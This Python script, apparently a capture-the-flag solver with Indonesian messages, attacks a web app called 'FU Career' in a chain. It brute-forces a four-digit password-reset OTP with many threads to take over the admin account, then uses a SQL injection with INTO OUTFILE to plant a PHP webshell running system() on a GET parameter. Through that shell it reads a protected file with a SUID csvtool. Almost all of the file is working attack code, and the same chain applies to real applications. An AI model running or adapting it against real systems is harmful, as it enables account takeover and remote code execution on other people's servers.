#!/usr/bin/env python3
from __future__ import annotations

import argparse
import concurrent.futures
import random
import re
import string
import sys
import threading
import time
from dataclasses import dataclass
from urllib.parse import urljoin

import requests


@dataclass(frozen=True)
class Config:
    base_url: str
    username: str
    password: str
    workers: int
    timeout: float


class ExploitError(RuntimeError):
    pass


def random_text(length: int = 12) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.SystemRandom().choice(alphabet) for _ in range(length))


def endpoint(base_url: str, path: str) -> str:
    return urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))


def trigger_admin_otp(cfg: Config) -> None:
    with requests.Session() as session:
        response = session.post(
            endpoint(cfg.base_url, "/forgot.php"),
            data={"username": cfg.username},
            timeout=cfg.timeout,
            allow_redirects=False,
        )

    location = response.headers.get("Location", "")
    if response.status_code not in (301, 302, 303, 307, 308) or "reset.php" not in location:
        raise ExploitError(
            f"Gagal membuat OTP admin: HTTP {response.status_code}, "
            f"Location={location!r}, body={response.text[:200]!r}"
        )

    print(f"[+] OTP reset untuk {cfg.username!r} berhasil dibuat")


def brute_force_otp(cfg: Config) -> str:
    reset_url = endpoint(cfg.base_url, f"/reset.php?username={cfg.username}")
    stop = threading.Event()
    found_lock = threading.Lock()
    found: list[str] = []
    attempted = 0
    attempted_lock = threading.Lock()
    started = time.monotonic()

    def try_code(number: int) -> str | None:
        nonlocal attempted

        if stop.is_set():
            return None

        otp = f"{number:04d}"

        try:
            response = requests.post(
                reset_url,
                data={
                    "otp": otp,
                    "password": cfg.password,
                },
                timeout=cfg.timeout,
                allow_redirects=False,
            )
        except requests.RequestException:
            return None

        with attempted_lock:
            attempted += 1
            count = attempted

            if count % 500 == 0:
                elapsed = max(time.monotonic() - started, 0.001)
                speed = count / elapsed
                print(f"[*] OTP attempts: {count}/10000 ({speed:.1f} req/s)")

        location = response.headers.get("Location", "")

        if (
            response.status_code in (301, 302, 303, 307, 308)
            and "login.php" in location
        ):
            with found_lock:
                if not found:
                    found.append(otp)
                    stop.set()

            return otp

        return None

    print(f"[*] Brute-force OTP dengan {cfg.workers} worker")

    with concurrent.futures.ThreadPoolExecutor(
        max_workers=cfg.workers
    ) as pool:
        futures = [
            pool.submit(try_code, number)
            for number in range(10000)
        ]

        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
            except Exception:
                continue

            if result is not None:
                break

        stop.set()

        for future in futures:
            future.cancel()

    if not found:
        raise ExploitError(
            "OTP tidak ditemukan. OTP mungkin kedaluwarsa, target overload, "
            "atau terkena rate limit. Jalankan ulang solver."
        )

    print(f"[+] OTP ditemukan: {found[0]}")
    print(f"[+] Password admin diubah menjadi: {cfg.password}")

    return found[0]


def admin_login(cfg: Config) -> requests.Session:
    session = requests.Session()

    response = session.post(
        endpoint(cfg.base_url, "/login.php"),
        data={
            "username": cfg.username,
            "password": cfg.password,
        },
        timeout=cfg.timeout,
        allow_redirects=False,
    )

    location = response.headers.get("Location", "")

    if (
        response.status_code not in (301, 302, 303, 307, 308)
        or "dashboard.php" not in location
    ):
        session.close()
        raise ExploitError(
            f"Login admin gagal: HTTP {response.status_code}, "
            f"Location={location!r}, body={response.text[:200]!r}"
        )

    admin_page = session.get(
        endpoint(cfg.base_url, "/admin.php"),
        timeout=cfg.timeout,
    )

    if (
        admin_page.status_code != 200
        or b"Admin Console" not in admin_page.content
    ):
        session.close()
        raise ExploitError(
            f"Session bukan admin: HTTP {admin_page.status_code}, "
            f"body={admin_page.text[:200]!r}"
        )

    print("[+] Login admin berhasil")

    return session


def extract_part1(admin_html: bytes) -> str:
    match = re.search(
        rb"part1\s*:\s*([^<\r\n]+)",
        admin_html,
        re.IGNORECASE,
    )

    if not match:
        raise ExploitError("Flag part 1 tidak ditemukan di admin.php")

    part1 = match.group(1).decode(
        "utf-8",
        errors="replace",
    ).strip()

    print(f"[+] Flag part 1: {part1}")

    return part1


def extract_shell_output(body: str, begin: str, end: str) -> str:
    start = body.find(begin)
    finish = body.find(end, start + len(begin))

    if start < 0 or finish < 0:
        raise ExploitError("Marker output webshell tidak ditemukan")

    return body[start + len(begin):finish]


def write_webshell(
    cfg: Config,
    session: requests.Session,
) -> str:
    shell_name = f"cv_{random_text(12)}.php"
    shell_path = f"/var/www/html/uploads/{shell_name}"

    marker_begin = "__RCE_BEGIN_6f59__"
    marker_end = "__RCE_END_6f59__"

    php = (
        "<?php "
        f"echo '{marker_begin}';"
        "system($_GET['cmd'] ?? 'id');"
        f"echo '{marker_end}';"
        "?>"
    )

    php_hex = php.encode().hex()

    # Tabel cv_submissions punya 9 kolom.
    # Payload PHP ditempatkan pada kolom string ketiga.
    injection = (
        "-1 UNION ALL SELECT "
        f"1,1,0x{php_hex},0x78,0x78,0x78,0x78,0x78,NOW() "
        f"INTO OUTFILE '{shell_path}'-- -"
    )

    print(f"[*] Menulis webshell lewat SQLi: {shell_name}")

    try:
        response = session.post(
            endpoint(cfg.base_url, "/preview.php"),
            data={"cv_id": injection},
            timeout=cfg.timeout,
            allow_redirects=False,
        )

        print(f"[*] Respons SQLi: HTTP {response.status_code}")

    except requests.RequestException as exc:
        # INTO OUTFILE bisa tetap sukses walau request PHP error.
        print(f"[*] Request SQLi terputus ({exc}); tetap cek webshell")

    shell_url = endpoint(
        cfg.base_url,
        f"/uploads/{shell_name}",
    )

    for _ in range(5):
        try:
            check = session.get(
                shell_url,
                params={"cmd": "id"},
                timeout=cfg.timeout,
            )

            if (
                marker_begin in check.text
                and marker_end in check.text
            ):
                output = extract_shell_output(
                    check.text,
                    marker_begin,
                    marker_end,
                )

                print(f"[+] RCE aktif: {output.strip()}")

                return shell_url

        except requests.RequestException:
            pass

        time.sleep(0.5)

    raise ExploitError(
        "Webshell tidak terbentuk. Kemungkinan FILE privilege hilang, "
        "uploads tidak writable, atau jumlah kolom SQL berbeda."
    )


def run_shell(
    cfg: Config,
    session: requests.Session,
    shell_url: str,
    command: str,
) -> str:
    begin = "__RCE_BEGIN_6f59__"
    end = "__RCE_END_6f59__"

    response = session.get(
        shell_url,
        params={"cmd": command},
        timeout=cfg.timeout,
    )

    response.raise_for_status()

    return extract_shell_output(
        response.text,
        begin,
        end,
    ).strip()


def recover_flag(
    cfg: Config,
    session: requests.Session,
    shell_url: str,
    part1: str,
) -> str:
    commands = [
        "/usr/bin/csvtool cat /part2.txt 2>&1",
        "/usr/bin/csvtool readable /part2.txt 2>&1",
    ]

    outputs: list[str] = []

    for command in commands:
        output = run_shell(
            cfg,
            session,
            shell_url,
            command,
        )

        outputs.append(output)

        print(f"[*] {command}")
        print(output)

        combined = part1 + output

        match = re.search(
            r"LYKN(?:CTF)?\{[^}\r\n]*\}",
            combined,
        )

        if match:
            return match.group(0)

    combined_all = part1 + "\n".join(outputs)

    match = re.search(
        r"LYKN(?:CTF)?\{.*?\}",
        combined_all,
        re.DOTALL,
    )

    if match:
        return re.sub(
            r"\s+",
            "",
            match.group(0),
        )

    raise ExploitError(
        f"RCE berhasil tetapi flag gagal dirangkai. "
        f"part1={part1!r}, part2 outputs={outputs!r}"
    )


def parse_args() -> Config:
    parser = argparse.ArgumentParser(
        description=(
            "FU Career exploit: OTP brute-force -> admin -> "
            "SQLi INTO OUTFILE -> RCE -> SUID csvtool"
        )
    )

    parser.add_argument(
        "url",
        help="Base URL, contoh: http://host:2412/",
    )

    parser.add_argument(
        "--username",
        default="admin",
    )

    parser.add_argument(
        "--password",
        default=f"Nata-{random_text(14)}",
    )

    parser.add_argument(
        "--workers",
        type=int,
        default=25,
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
    )

    args = parser.parse_args()

    if args.workers < 1 or args.workers > 100:
        parser.error("--workers harus 1 sampai 100")

    return Config(
        base_url=args.url,
        username=args.username,
        password=args.password,
        workers=args.workers,
        timeout=args.timeout,
    )


def main() -> int:
    cfg = parse_args()

    print(f"[*] Target: {cfg.base_url}")

    try:
        trigger_admin_otp(cfg)
        brute_force_otp(cfg)

        session = admin_login(cfg)

        try:
            admin_html = session.get(
                endpoint(cfg.base_url, "/admin.php"),
                timeout=cfg.timeout,
            ).content

            part1 = extract_part1(admin_html)

            shell_url = write_webshell(
                cfg,
                session,
            )

            flag = recover_flag(
                cfg,
                session,
                shell_url,
                part1,
            )

        finally:
            session.close()

    except (
        ExploitError,
        requests.RequestException,
    ) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1

    print(f"<FLAG>{flag}</FLAG>")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
